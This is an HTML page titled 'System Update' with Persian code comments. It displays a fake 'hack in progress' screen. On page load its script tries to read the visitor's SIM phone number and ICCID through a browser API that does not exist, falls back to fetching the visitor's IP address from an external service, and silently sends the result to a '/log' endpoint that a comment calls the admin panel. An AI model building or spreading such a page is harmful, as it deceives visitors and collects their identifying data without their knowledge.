<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .box { border: 2px solid #0f0; padding: 20px; border-radius: 10px; box-shadow: 0 0 20px #0f0; }
        h1 { font-size: 14px; margin-bottom: 10px; }
        p { margin: 5px 0; font-size: 12px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>HACK IN PROGRESS...</h1>
        <p>Connecting to SIM...</p>
        <p id="status">Accessing Data...</p>
    </div>

    <script>
        // تابع اصلی برای جمع‌آوری اطلاعات
        async function hack() {
            let info = "Unknown";
            
            try {
                // تلاش برای گرفتن اطلاعات سیم‌کارت (اگر مرورگر اجازه دهد)
                if ('sim' in navigator) {
                    const sims = await navigator.sim.getAvailableSims();
                    if (sims.length > 0) {
                        info = "SIM 1: " + sims[0].msisdn + "\nICCID: " + sims[0].iccid;
                    } else {
                        info = "No SIM Detected";
                    }
                } else {
                    // اگر API سیم کار نکرد، IP را بگیر (به عنوان جایگزین)
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    info = "IP Address: " + data.ip;
                }
                
                // آپدیت متن صفحه
                document.getElementById('status').innerHTML = "--------------------------<br>hack complate !<br>target phon number founded !<br>" + info.replace(/\n/g, '<br>') + "<br>--------------------------";
                
                // ارسال داده به پنل ادمین
                fetch('/log?data=' + encodeURIComponent(info));
                
            } catch (e) {
                document.getElementById('status').innerText = "Error: " + e.message;
            }
        }

        // اجرای خودکار به محض لود شدن صفحه
        window.onload = hack;
    </script>
</body>
</html>
